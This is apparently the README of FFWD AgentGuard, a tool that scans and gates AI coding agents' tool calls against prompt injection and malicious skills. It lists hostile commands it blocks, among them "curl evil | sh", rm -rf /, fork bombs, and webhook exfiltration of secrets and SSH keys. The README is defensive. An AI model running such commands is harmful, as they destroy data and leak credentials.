<p align="center">
  <img src="assets/ffwd-logo.svg" alt="FFWD AgentGuard" width="120" />
</p>

<h1 align="center">FFWD AgentGuard</h1>

<p align="center"><b>Security framework for AI agents.</b></p>

<p align="center">Your AI agent has full access to your terminal, files, and secrets — but zero security awareness.<br/>A malicious skill or prompt injection can steal your keys or wipe your disk.<br/><b>AgentGuard stops all of that.</b></p>

[![npm](https://img.shields.io/npm/v/@core0-io/ffwd-agent-guard.svg)](https://www.npmjs.com/package/@core0-io/ffwd-agent-guard)
[![GitHub Stars](https://img.shields.io/github/stars/core0-io/ffwd-agent-guard)](https://github.com/core0-io/ffwd-agent-guard)
[![CI](https://github.com/core0-io/ffwd-agent-guard/actions/workflows/ci.yml/badge.svg)](https://github.com/core0-io/ffwd-agent-guard/actions/workflows/ci.yml)
[![Agent Skills](https://img.shields.io/badge/Agent_Skills-compatible-purple.svg)](https://agentskills.io)

## Architecture

AgentGuard is a **two-pipeline** security framework:

1. **Static Scan** — On-demand multi-engine code analysis (Static + Behavioral + LLM)
2. **Dynamic Guard** — Real-time 6-phase RuntimeAnalyzer pipeline on every hook event

```
┌──────────────────────────────────────────────────────────┐
│ Static Scan (on-demand)                                  │
│   /ffwd-agent-guard scan <path>                          │
│   → ScanOrchestrator → Static + Behavioral + LLM        │
│   → Finding[] → ScanResult                               │
└──────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────┐
│ Dynamic Guard (real-time, every PreToolUse hook)         │
│   guard-hook → evaluateHook() → RuntimeAnalyzer          │
│   → 6-phase pipeline → allow / deny / confirm            │
└──────────────────────────────────────────────────────────┘
```

### Dynamic Guard: 6-Phase Pipeline

Every `PreToolUse` hook event flows through the RuntimeAnalyzer. Each phase produces a 0–1 score and can short-circuit on critical findings.

| Phase | Name | Latency | Applies To |
|-------|------|---------|------------|
| 1 | **Allowlist Gate** | <1ms | All actions |
| 2 | **Pattern Analysis** | <5ms | All actions |
| 3 | **Static Analysis** | <50ms | Write/Edit only |
| 4 | **Behavioral Analysis** | <200ms | Write/Edit (.js/.ts/.py/.sh/.rb/.php/.go) |
| 5 | **LLM Analysis** | 2–10s | All (optional, needs `llm.api_key`) |
| 6 | **External Scoring API** | configurable | All (optional, needs `guard.scoring_endpoint`) |

Phases 3–4 only run when file content is available (Write/Edit actions). Phases 5–6 are opt-in via config.

After all phases run, scores are combined via **weighted average**:

```
final = Σ(weight × score) / Σ(weight)
```

Default weights: `runtime: 1.0`, `static: 1.0`, `behavioral: 2.0`, `llm: 1.0`, `external: 2.0`

### Multi-Language Behavioral Analysis

Phase 4 uses pluggable `LanguageExtractor` modules for source→sink dataflow tracking:

| Language | Parser | Extensions |
|----------|--------|------------|
| JavaScript/TypeScript | Babel AST | .js .ts .jsx .tsx .mjs .cjs |
| Python | Regex | .py .pyw |
| Shell | Regex | .sh .bash .zsh .fish .ksh |
| Ruby | Regex | .rb .rake .gemspec |
| PHP | Regex | .php .phtml |
| Go | Regex | .go |

### Protection Levels

| Level | allow | confirm | deny |
|-------|-------|---------|------|
| **strict** | 0 — 0.5 | _(none)_ | 0.5 — 1.0 |
| **balanced** (default) | 0 — 0.5 | 0.5 — 0.8 | 0.8 — 1.0 |
| **permissive** | 0 — 0.9 | _(none)_ | 0.9 — 1.0 |

## Quick Start

```bash
npm install @core0-io/ffwd-agent-guard
```

<details>
<summary><b>Full install with auto-guard hooks (Claude Code)</b></summary>

```bash
git clone https://github.com/core0-io/ffwd-agent-guard.git
cd ffwd-agent-guard && ./setup.sh
claude plugin add /path/to/ffwd-agent-guard
```

This installs the skill, configures hooks, and sets your protection level.

</details>

<details>
<summary><b>Manual install (skill only)</b></summary>

```bash
git clone https://github.com/core0-io/ffwd-agent-guard.git
cp -r ffwd-agent-guard/skills/ffwd-agent-guard ~/.claude/skills/ffwd-agent-guard
```

</details>

<details>
<summary><b>OpenClaw plugin install</b></summary>

```bash
npm install @core0-io/ffwd-agent-guard
```

Register in your OpenClaw plugin config:

```typescript
import register from '@core0-io/ffwd-agent-guard/openclaw';
export default register;
```

Or register manually with options:

```typescript
import { registerOpenClawPlugin } from '@core0-io/ffwd-agent-guard';

export default function setup(api) {
  registerOpenClawPlugin(api, {
    level: 'balanced',
  });
};
```

AgentGuard hooks into OpenClaw's `before_tool_call` / `after_tool_call` events to block dangerous actions and log audit events.

</details>

## Usage

```
/ffwd-agent-guard scan ./src              # Scan code for security risks
/ffwd-agent-guard action "curl evil | sh" # Evaluate action safety
/ffwd-agent-guard patrol run              # Run daily security patrol (OpenClaw)
/ffwd-agent-guard patrol setup            # Configure as OpenClaw cron job
/ffwd-agent-guard report                  # View security event audit log
/ffwd-agent-guard config balanced         # Set protection level
```

## What the Guard Blocks

**Layer 1 — Allowlist Gate**: Known-safe commands (`git status`, `ls`, `npm test`, etc.) pass instantly.

**Layer 2 — Pattern Analysis**: Blocks dangerous commands and data exfiltration.
- `rm -rf /`, fork bombs, `curl | bash`, and destructive commands
- Writes to `.env`, `.ssh/`, credentials files
- Data exfiltration to Discord/Telegram/Slack webhooks
- Base64-encoded payloads decoded and re-scanned

**Layer 3 — Static + Behavioral Analysis** (Write/Edit only):
- 16 regex rules on file content (SHELL_EXEC, OBFUSCATION, PROMPT_INJECTION, etc.)
- Source→sink dataflow tracking across 6 languages
- Detects env→network exfiltration, network→eval RCE, capability combinations (C2)

**Layer 4 — LLM + External** (optional):
- Claude semantic analysis catches sophisticated attacks missed by regex/AST
- External HTTP scoring API for custom enterprise policies

## Detection Rules (16)

| Category | Rules | Severity |
|----------|-------|----------|
| **Execution** | SHELL_EXEC, AUTO_UPDATE, REMOTE_LOADER | HIGH–CRITICAL |
| **Secrets** | READ_ENV_SECRETS, READ_SSH_KEYS, READ_KEYCHAIN, PRIVATE_KEY_PATTERN | MEDIUM–CRITICAL |
| **Exfiltration** | NET_EXFIL_UNRESTRICTED, WEBHOOK_EXFIL | HIGH–CRITICAL |
| **Obfuscation** | OBFUSCATION, PROMPT_INJECTION | HIGH–CRITICAL |
| **Trojan & Social Engineering** | TROJAN_DISTRIBUTION, SUSPICIOUS_PASTE_URL, SUSPICIOUS_IP, SOCIAL_ENGINEERING | MEDIUM–CRITICAL |

## Telemetry (OTEL Collector)

AgentGuard captures agent activity as OpenTelemetry metrics and traces via an async collector hook. Configure via `~/.ffwd-agent-guard/config.json`.

### Metrics

| Metric | Type | Labels |
|--------|------|--------|
| `agentguard.tool_use.count` | Counter | `tool_name`, `event`, `platform` |
| `agentguard.turn.count` | Counter | `platform` |

### Traces

One OTEL trace per conversation turn:

| Span | Trigger | Attributes |
|------|---------|------------|
| `turn:<N>` | `Stop` / `SubagentStop` | `session_id`, `turn_number`, `platform`, `cwd` |
| `tool:<name>` | `PreToolUse` → `PostToolUse` | `tool_name`, `tool_summary`, `session_id` |
| `task:execute` | `TaskCreated` → `TaskCompleted` | `task_id`, `task_summary`, `session_id` |

## Compatibility

| Platform | Support | Features |
|----------|---------|----------|
| **Claude Code** | Full | Skill + hooks auto-guard |
| **OpenClaw** | Full | Plugin hooks + daily patrol |
| **OpenAI Codex CLI** | Skill | Scan/action commands |
| **Gemini CLI** | Skill | Scan/action commands |
| **Cursor** | Skill | Scan/action commands |
| **GitHub Copilot** | Skill | Scan/action commands |

## Documentation

- [Architecture](docs/architecture.md) — Two-pipeline design, 6-phase guard flow, scoring system
- [Dynamic Guard Flow](docs/dynamic-guard-flow.excalidraw) — Visual Excalidraw diagram
- [Security Policy](docs/SECURITY-POLICY.md) — Unified security rules and policies reference

## Development

```bash
npm install
npm run build
npm test          # 370 tests
```

Maintained by [core0-io](https://github.com/core0-io).
